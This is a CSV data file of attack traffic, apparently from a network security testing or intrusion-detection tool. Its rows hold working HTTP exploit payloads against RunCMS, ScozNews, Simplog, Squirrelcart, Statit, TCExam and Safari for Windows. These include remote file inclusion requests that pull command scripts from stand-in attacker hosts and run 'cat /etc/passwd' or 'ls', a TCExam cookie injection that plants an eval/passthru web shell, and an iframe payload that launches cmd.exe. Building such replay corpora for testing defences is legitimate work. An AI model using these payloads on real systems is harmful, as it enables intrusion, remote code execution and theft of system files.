XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
runcms_cmi_b.xml,RunCMS Remote Code Execution Vulnerability,This threat sends a crafted POST payload containing PHP code that when retrieved using a remote file inclusion flaw allows arbitrary command execution. RunCMS is a web application which typically listens on port 80.,HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿runcms_cmi_b_IPv6.xml,RunCMS Remote Code Execution Vulnerability (IPv6 Version),This threat sends a crafted POST payload containing PHP code that when retrieved using a remote file inclusion flaw allows arbitrary command execution. RunCMS is a web application which typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"POST editor/filemanager/browser/default/connectors/php/connector.php?Command=&Type=File&CurrentFolder= HTTP/1.1[[0D 0A ]]Content-Type: multipart/form-data; boundary=---------------------------7d529a1d23092a[[0D 0A ]]User-Agent: Sun-tzu giving you the pain[[0D 0A ]]Host: www.example.com[[0D 0A ]]Content-Length: 194[[0D 0A ]]Connection: Keep-Alive[[0D 0A 0D 0A ]]-----------------------------7d529a1d23092a[[0D 0A ]]Content-Disposition: form-data; name=""NewFile""; filename=""suntzu3423.18748782712""[[0D 0A ]]Content-Type:[[0D 0A 0D 0A 0D 0A ]]-----------------------------7d529a1d23092a--[[0D 0A 0D 0A 0D 0A ]]GET suntzu3423.18748782712?cmd=cat%20/etc/passwd HTTP/1.1[[0D 0A ]]User-Agent: GoogleBot/1.1[[0D 0A ]]Host: www.example.com[[0D 0A ]]Connection: Close[[0D 0A 0D 0A]]"
runcms_cmi_b_IPv6.xml,RunCMS Remote Code Execution Vulnerability (IPv6 Version),This threat sends a crafted POST payload containing PHP code that when retrieved using a remote file inclusion flaw allows arbitrary command execution. RunCMS is a web application which typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿safari_windows_cmi.xml,Safari 3 for Windows Beta Remote Command Execution Vulnerability,This threat demonstrates a flaw in Apple Safari for Windows that allows for execution of arbitrary commands via shell metacharacters in a URI in the SRC of an IFRAME embedded in a web page. This attack is delivered via port 80.,HTTP,TCP,GET /index.html HTTP/1.0[[0D 0A ]]Host: www.site.net[[0D 0A ]]User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)[[0D 0A ]]Connection: Close[[0D 0A 0D 0A]]
safari_windows_cmi.xml,Safari 3 for Windows Beta Remote Command Execution Vulnerability,This threat demonstrates a flaw in Apple Safari for Windows that allows for execution of arbitrary commands via shell metacharacters in a URI in the SRC of an IFRAME embedded in a web page. This attack is delivered via port 80.,HTTP,TCP,"HTTP/1.0 200 OK[[0D 0A ]]Wed, 6 Jun 2007 10:08:40 GMT[[0D 0A ]]Server: Apache[[0D 0A ]]Accept-Ranges: bytes[[0D 0A ]]Connection: Keep-Alive[[0D 0A ]]Content Type: text/html[[0D 0A 0D 0A ]]<html><body>[[0D 0A ]]<iframe src='gopher://gopher.std.com/"" -chrome ""javascript:C=Components.classes;I=Components.interfaces;file=C[&#39;@mozilla.org/file/local;1&#39;].createInstance(I.nsILocalFile);file.initWithPath(&#39;C:&#39;+String.fromCharCode(92)+String.fromCharCode(92)+&#39;Windows&#39;+String.fromCharCode(92)+String.fromCharCode(92)+&#39;System32&#39;+String.fromCharCode(92)+String.fromCharCode(92)+&#39;cmd.exe&#39;);process=C[&#39;@mozilla.org/process/util;1&#39;].createInstance(I.nsIProcess);process.init(file);process.run(true&#44;{}&#44;0);alert(process)'></iframe>process.init(file);process.run(true,{},0);alert(process)[[0D 0A ]]</body></html>[[0D 0A]]"
﻿safari_windows_cmi_IPv6.xml,Safari 3 for Windows Beta Remote Command Execution Vulnerability (IPv6 Version),This threat demonstrates a flaw in Apple Safari for Windows that allows for execution of arbitrary commands via shell metacharacters in a URI in the SRC of an IFRAME embedded in a web page. This attack is delivered via port 80. (IPv6 Version),HTTP/IPv6,TCP,GET /index.html HTTP/1.0[[0D 0A ]]Host: www.site.net[[0D 0A ]]User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)[[0D 0A ]]Connection: Close[[0D 0A 0D 0A]]
safari_windows_cmi_IPv6.xml,Safari 3 for Windows Beta Remote Command Execution Vulnerability (IPv6 Version),This threat demonstrates a flaw in Apple Safari for Windows that allows for execution of arbitrary commands via shell metacharacters in a URI in the SRC of an IFRAME embedded in a web page. This attack is delivered via port 80. (IPv6 Version),HTTP/IPv6,TCP,"HTTP/1.0 200 OK[[0D 0A ]]Wed, 6 Jun 2007 10:08:40 GMT[[0D 0A ]]Server: Apache[[0D 0A ]]Accept-Ranges: bytes[[0D 0A ]]Connection: Keep-Alive[[0D 0A ]]Content Type: text/html[[0D 0A 0D 0A ]]<html><body>[[0D 0A ]]<iframe src='gopher://gopher.std.com/"" -chrome ""javascript:C=Components.classes;I=Components.interfaces;file=C[&#39;@mozilla.org/file/local;1&#39;].createInstance(I.nsILocalFile);file.initWithPath(&#39;C:&#39;+String.fromCharCode(92)+String.fromCharCode(92)+&#39;Windows&#39;+String.fromCharCode(92)+String.fromCharCode(92)+&#39;System32&#39;+String.fromCharCode(92)+String.fromCharCode(92)+&#39;cmd.exe&#39;);process=C[&#39;@mozilla.org/process/util;1&#39;].createInstance(I.nsIProcess);process.init(file);process.run(true&#44;{}&#44;0);alert(process)'></iframe>process.init(file);process.run(true,{},0);alert(process)[[0D 0A ]]</body></html>[[0D 0A]]"
﻿scoznews_cmi.xml,ScozNet ScozNews Multiple Remote File Include Vulnerabilities,This threat send a crafted HTTP query containing a local or remote path to a file which is included into the PHP source via template.php's CONFIG[main_path] parameter. ScozNews is a web based application which typically listens on port 80.,HTTP,TCP,"GET /scozanews%2Fcron.php%3FROOT_PATH%3Dhttp%3A%2F%2Fwww.attacker.com%2Fcmd.txt%3F%26cmd%3Dls HTTP/1.1[[0D 0A ]]Accept: text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav[[0D 0A ]]Accept-Encoding: gzip, compress[[0D 0A ]]Accept-Language: en[[0D 0A ]]User-Agent: Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i[[0D 0A ]]HOST: www.example.com[[0D 0A 0D 0A]]"
scoznews_cmi.xml,ScozNet ScozNews Multiple Remote File Include Vulnerabilities,This threat send a crafted HTTP query containing a local or remote path to a file which is included into the PHP source via template.php's CONFIG[main_path] parameter. ScozNews is a web based application which typically listens on port 80.,HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿scoznews_cmi_IPv6.xml,ScozNet ScozNews Multiple Remote File Include Vulnerabilities (IPv6 Version),This threat send a crafted HTTP query containing a local or remote path to a file which is included into the PHP source via template.php's CONFIG[main_path] parameter. ScozNews is a web based application which typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"GET /scozanews%2Fcron.php%3FROOT_PATH%3Dhttp%3A%2F%2Fwww.attacker.com%2Fcmd.txt%3F%26cmd%3Dls HTTP/1.1[[0D 0A ]]Accept: text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav[[0D 0A ]]Accept-Encoding: gzip, compress[[0D 0A ]]Accept-Language: en[[0D 0A ]]User-Agent: Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i[[0D 0A ]]HOST: www.example.com[[0D 0A 0D 0A]]"
scoznews_cmi_IPv6.xml,ScozNet ScozNews Multiple Remote File Include Vulnerabilities (IPv6 Version),This threat send a crafted HTTP query containing a local or remote path to a file which is included into the PHP source via template.php's CONFIG[main_path] parameter. ScozNews is a web based application which typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿simplog_cmi.xml,Simplog  0.9.2  Remote Command Execution Exploit,"This threat exploits simplog by inserting a url into a cookie variable which allows for an arbitrary PHP file inclusion, this code is then executed by the server. Simplog is a web application and typically listens on port 80.",HTTP,TCP,GET /simplog/doc/index.php HTTP/1.0[[0D 0A ]]User-Agent: Googlebot/2.1[[0D 0A ]]Host: www.example.com[[0D 0A ]]Cookie: s=http://somehost.com%2fsuntzu; cmd=+cat+%2Fetc%2Fpasswd;[[0D 0A ]]Connection: Close[[0D 0A 0D 0A 0D 0A]]
simplog_cmi.xml,Simplog  0.9.2  Remote Command Execution Exploit,"This threat exploits simplog by inserting a url into a cookie variable which allows for an arbitrary PHP file inclusion, this code is then executed by the server. Simplog is a web application and typically listens on port 80.",HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿simplog_cmi_IPv6.xml,Simplog  0.9.2  Remote Command Execution Exploit (IPv6 Version),"This threat exploits simplog by inserting a url into a cookie variable which allows for an arbitrary PHP file inclusion, this code is then executed by the server. Simplog is a web application and typically listens on port 80. (IPv6 Version)",HTTP/IPv6,TCP,GET /simplog/doc/index.php HTTP/1.0[[0D 0A ]]User-Agent: Googlebot/2.1[[0D 0A ]]Host: www.example.com[[0D 0A ]]Cookie: s=http://somehost.com%2fsuntzu; cmd=+cat+%2Fetc%2Fpasswd;[[0D 0A ]]Connection: Close[[0D 0A 0D 0A 0D 0A]]
simplog_cmi_IPv6.xml,Simplog  0.9.2  Remote Command Execution Exploit (IPv6 Version),"This threat exploits simplog by inserting a url into a cookie variable which allows for an arbitrary PHP file inclusion, this code is then executed by the server. Simplog is a web application and typically listens on port 80. (IPv6 Version)",HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿squirrelcart_cmi.xml,Squirrelcart 2.2.0 (cart_content.php) Remote File Inclusion,This threat send a crafted HTTP query containing a local or remote path to a file which is included into the PHP source via cart_content.php's cart_isp_root parameter. Squirrelcart is a web based application which typically listens on port 80.,HTTP,TCP,"GET /cart_content.php%3Fcart_isp_root%3Dhttp%3A%2F%2Fyourhost%2Fcmd.gif%3Fcmd%3Dls HTTP/1.1[[0D 0A ]]Accept: text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav[[0D 0A ]]Accept-Encoding: gzip, compress[[0D 0A ]]Accept-Language: en[[0D 0A ]]User-Agent: Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i[[0D 0A ]]HOST: www.example.com[[0D 0A 0D 0A]]"
squirrelcart_cmi.xml,Squirrelcart 2.2.0 (cart_content.php) Remote File Inclusion,This threat send a crafted HTTP query containing a local or remote path to a file which is included into the PHP source via cart_content.php's cart_isp_root parameter. Squirrelcart is a web based application which typically listens on port 80.,HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿squirrelcart_cmi_IPv6.xml,Squirrelcart 2.2.0 (cart_content.php) Remote File Inclusion (IPv6 Version),This threat send a crafted HTTP query containing a local or remote path to a file which is included into the PHP source via cart_content.php's cart_isp_root parameter. Squirrelcart is a web based application which typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"GET /cart_content.php%3Fcart_isp_root%3Dhttp%3A%2F%2Fyourhost%2Fcmd.gif%3Fcmd%3Dls HTTP/1.1[[0D 0A ]]Accept: text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav[[0D 0A ]]Accept-Encoding: gzip, compress[[0D 0A ]]Accept-Language: en[[0D 0A ]]User-Agent: Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i[[0D 0A ]]HOST: www.example.com[[0D 0A 0D 0A]]"
squirrelcart_cmi_IPv6.xml,Squirrelcart 2.2.0 (cart_content.php) Remote File Inclusion (IPv6 Version),This threat send a crafted HTTP query containing a local or remote path to a file which is included into the PHP source via cart_content.php's cart_isp_root parameter. Squirrelcart is a web based application which typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿statit_cmi.xml,"Statit V4 Remote File Inclusion exploit
",This threat sends a crafted HTTP GET query which allows an arbitrary file inclusion via the statitpath argument. Statit is a web application with typically listens on port 80. ,HTTP,TCP,"GET /visible_count_inc.php?statitpath=http://www.atacker.com/cmd.php?&cmd=cat%20/etc/passwd HTTP/1.1[[0D 0A ]]TE: deflate,gzip;q=0.3[[0D 0A ]]Connection: TE, close[[0D 0A ]]Host: www.example.com[[0D 0A ]]User-Agent: libwww-perl/5.803[[0D 0A 0D 0A 0D 0A]]"
statit_cmi.xml,"Statit V4 Remote File Inclusion exploit
",This threat sends a crafted HTTP GET query which allows an arbitrary file inclusion via the statitpath argument. Statit is a web application with typically listens on port 80. ,HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿statit_cmi_IPv6.xml,"Statit V4 Remote File Inclusion exploit (IPv6 Version)",This threat sends a crafted HTTP GET query which allows an arbitrary file inclusion via the statitpath argument. Statit is a web application with typically listens on port 80.  (IPv6 Version),HTTP/IPv6,TCP,"GET /visible_count_inc.php?statitpath=http://www.atacker.com/cmd.php?&cmd=cat%20/etc/passwd HTTP/1.1[[0D 0A ]]TE: deflate,gzip;q=0.3[[0D 0A ]]Connection: TE, close[[0D 0A ]]Host: www.example.com[[0D 0A ]]User-Agent: libwww-perl/5.803[[0D 0A 0D 0A 0D 0A]]"
statit_cmi_IPv6.xml,"Statit V4 Remote File Inclusion exploit (IPv6 Version)",This threat sends a crafted HTTP GET query which allows an arbitrary file inclusion via the statitpath argument. Statit is a web application with typically listens on port 80.  (IPv6 Version),HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿tcexam_cmi.xml,"TCExam <= 4.0.011 $_COOKIE[""SessionUserLang""] shell injection exploit
TCExam <= 4.0.011 $_COOKIE[""SessionUserLang""] shell injection exploit
TCExam <= 4.0.011 $_COOKIE[""SessionUserLang""] shell injection exploit
",This threat demonstrates a shell injection flaw via a php cookie session variable which can be freely set by the attacker. This threat is delivered by the HTTP protocol on port 80.,HTTP,TCP,GET /tcexam/public/code/index.php HTTP/1.0[[0D 0A ]]Host: google.com[[0D 0A ]]User-Agent: Googlebot/2.1[[0D 0A ]]Cookie: SessionUserLang=%2F..%2F%0Aeval%28%24_SERVER%5BHTTP_CMD%5D%29%3B%3F%3E%23%2F..%2Fsuntzu;[[0D 0A ]]Connection: Keep-Alive[[0D 0A 0D 0A]]
tcexam_cmi.xml,"TCExam <= 4.0.011 $_COOKIE[""SessionUserLang""] shell injection exploit
TCExam <= 4.0.011 $_COOKIE[""SessionUserLang""] shell injection exploit
TCExam <= 4.0.011 $_COOKIE[""SessionUserLang""] shell injection exploit
",This threat demonstrates a shell injection flaw via a php cookie session variable which can be freely set by the attacker. This threat is delivered by the HTTP protocol on port 80.,HTTP,TCP,GET /tcexam/cache/suntzu.php HTTP/1.0[[0D 0A ]]Host: google.com[[0D 0A ]]User-Agent: Googlebot/2.1[[0D 0A ]]CMD: echo '_delim_';error_reporting(7);set_time_limit(0);passthru($_SERVER[HTTP_C]);echo '_delim_';[[0D 0A ]]C:  ls -la[[0D 0A ]]Connection: Close[[0D 0A 0D 0A]]
tcexam_cmi.xml,"TCExam <= 4.0.011 $_COOKIE[""SessionUserLang""] shell injection exploit
TCExam <= 4.0.011 $_COOKIE[""SessionUserLang""] shell injection exploit
TCExam <= 4.0.011 $_COOKIE[""SessionUserLang""] shell injection exploit
",This threat demonstrates a shell injection flaw via a php cookie session variable which can be freely set by the attacker. This threat is delivered by the HTTP protocol on port 80.,HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
